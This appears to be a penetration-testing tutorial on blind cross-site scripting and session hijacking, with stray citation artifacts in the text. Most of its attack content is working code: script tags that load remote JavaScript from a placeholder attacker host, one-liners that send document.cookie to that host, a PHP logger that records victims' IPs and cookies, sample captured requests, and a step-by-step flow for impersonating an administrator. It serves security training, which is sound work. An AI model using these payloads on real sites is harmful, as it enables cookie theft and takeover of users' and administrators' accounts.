# Session Hijacking

Modern web applications utilize cookies to maintain a user's session throughout different browsing sessions. This enables the user to only log in once and keep their logged-in session alive even if they visit the same website at another time or date. However, if a malicious user obtains the cookie data from the victim's browser, they may be able to gain logged-in access with the victim's user without knowing their credentials.

With the ability to execute JavaScript code on the victim's browser, we may be able to collect their cookies and send them to our server to hijack their logged-in session by performing a Session Hijacking (aka Cookie Stealing) attack. :contentReference[oaicite:0]{index=0}

# Blind XSS Detection

We usually start XSS attacks by trying to discover if and where an XSS vulnerability exists. However, in this exercise, we will be dealing with a Blind XSS vulnerability.

A Blind XSS vulnerability occurs when the vulnerability is triggered on a page we don't have access to. Blind XSS vulnerabilities usually occur with forms only accessible by certain users (e.g., Admins). Some potential examples include:

- Contact Forms
- Reviews
- User Details
- Support Tickets
- HTTP User-Agent Header

Consider a User Registration page that displays the following message after submission:

```text
Thank you for registering. An Admin will review your registration request.
```

This indicates that we will not see how our input is handled because it is only displayed to the administrator. In normal XSS testing, we can simply submit payloads and observe whether they execute. In Blind XSS, we cannot directly see the output. :contentReference[oaicite:1]{index=1}

# Detecting Blind XSS

To detect Blind XSS, we can use a payload that sends an HTTP request back to a server we control.

If the JavaScript executes, we will receive a request and know that the page is vulnerable.

Two challenges arise:

1. Which field is vulnerable?
2. Which XSS payload works?

---

# Loading a Remote Script

Instead of executing JavaScript directly, we can load a remote JavaScript file:

```html
<script src="http://OUR_IP/script.js"></script>
```

To identify which field is vulnerable, we can change the requested path based on the field name:

```html
<script src="http://OUR_IP/username"></script>
```

If we receive a request for:

```text
/username
```

then we know that the username field is vulnerable. :contentReference[oaicite:2]{index=2}

# Testing Individual Fields

Inject payloads into individual fields and append the field name to the URL:

```html
<script src=http://OUR_IP/fullname></script>
```

```html
<script src=http://OUR_IP/username></script>
```

This helps identify which field executes the payload.

### Notes

- Email fields are often validated on both the front-end and back-end.
- Password fields are commonly hashed and rarely displayed directly.
- Focus testing on fields likely to be displayed to administrators.

Once a request reaches your server, note:

1. Which field triggered the request.
2. Which payload successfully executed.

# Session Hijacking

After identifying a working payload and a vulnerable field, we can move to session hijacking.

The goal is to steal the victim's session cookie and use it to impersonate them.

Common payloads:

```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
```

```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

The second payload is generally preferred because it silently loads an image and appears less suspicious. :contentReference[oaicite:6]{index=6}

---

# Creating script.js

Create a JavaScript file named:

```text
script.js
```

Contents:

```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

Now update the XSS payload to load this file:

```html
<script src=http://OUR_IP/script.js></script>
```

Whenever the payload executes, the victim's browser loads `script.js`, which then sends the cookie to our server. 

---

# Creating a Cookie Logger

Create a PHP script named:

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);

    foreach ($list as $key => $value) {
        $cookie = urldecode($value);

        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

This script:

1. Receives the cookie.
2. Splits multiple cookies.
3. Logs them to a file.

# Capturing Cookies

When an administrator views the vulnerable page, the following requests appear:

```text
10.10.10.10:52798 [200]: /script.js
10.10.10.10:52799 [200]: /index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2
```

This confirms that:

1. The payload executed.
2. The browser sent its cookie.

# Attack Flow

```text
1. Identify Blind XSS vulnerability
2. Host remote JavaScript payload
3. Determine vulnerable field
4. Create cookie stealing script
5. Inject payload into vulnerable field
6. Wait for admin to view page
7. Receive victim cookie
8. Add stolen cookie to browser
9. Refresh application
10. Gain access as victim
```

# Key Takeaways

- Blind XSS occurs when payload execution happens on pages you cannot directly access.
- Remote script loading helps identify vulnerable fields.
- Cookies are commonly used to maintain authenticated sessions.
- JavaScript can exfiltrate cookies to an attacker-controlled server.
- Stolen session cookies can often be reused without knowing the victim's password.
- Session hijacking is one of the most impactful consequences of successful XSS exploitation.
